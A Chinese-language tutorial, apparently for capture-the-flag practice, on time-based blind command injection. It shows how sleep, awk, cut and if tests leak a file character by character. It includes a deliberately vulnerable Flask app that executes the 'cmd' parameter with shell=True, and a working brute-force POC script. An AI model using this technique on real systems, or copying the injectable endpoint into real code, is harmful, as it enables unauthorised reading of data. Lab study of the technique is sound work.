## 适用场景
---

- 无法执行 **shell 反弹**
- 无法回显内容
- 无文件写入权限


## 核心基础命令
---

### sleep 延时命令

用于控制命令执行延时

5 秒后返回命令执行结果：`sleep 5`

### awk NR 逐行读取

通过 `awk NR==行号` 读取文件的指定行内容

读取 flag.php 第1行`cat flag.php | awk NR==1`

读取 flag.php 第2行`cat flag.php | awk NR==2`

### cut -c 逐字符读取

配合逐行读取命令，精准提取指定位置的单个字符

读取第1行第1个字符`cat flag.php | awk NR==1 | cut -c 1`

读取第1行第2个字符`cat flag.php | awk NR==1 | cut -c 2`

### if 条件判断

通过 `if` 判断提取的字符是否匹配预期，匹配则执行延时，作为盲注的判定条件


判断第1行第2个字符是否为1，是则输出 right`if [ $(cat flag.php|awk NR==1|cut -c 2) == 1 ];then echo "right";fi`

判断第1行第2个字符是否为1，是则延时2秒`if [ $(cat flag.php|awk NR==1|cut -c 2) == 1 ];then sleep 2;fi`

> `if`、`[`、判断条件、`]` 之间**必须保留空格**，否则命令执行失败

## 本地靶场模拟
### 1. 搭建 Flask 模拟靶场
创建 `cmd_simulator.py`，实现命令执行接收功能，模拟漏洞靶场环境。
```python
from flask import Flask, request
import subprocess
import time

app = Flask(__name__)

@app.route('/')
def cmd_exec():
    cmd = request.args.get('cmd', '')
    if not cmd:
        return "no cmd"
    
    # 模拟靶场执行接收的命令
    try:
        result = subprocess.check_output(
            cmd, shell=True, stderr=subprocess.STDOUT, text=True
        )
        return result.strip()
    except:
        return "error"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8080, debug=False)
```

### 2. 本地 POC 验证脚本
创建同级目录 `poc.py`，用于本地测试命令盲注，读取 `flag.php` 内容。
```python
import requests
import time

url = "http://127.0.0.1:8080?cmd="
result = ""

print("[+]begin\n")

for line in range(1, 4):
    for pos in range(1, 60):
        for char in range(32, 128):
            time.sleep(0.1)
            c = chr(char)
            payload = f'if [ `cat flag | awk NR=={line} | cut -c {pos}` = {c} ];then sleep 3;fi'

            try:
                requests.get(url + payload, timeout=(1,2))
            except:
                result += c
                print(result)
                break

print("\n[+] finish, content:")
```
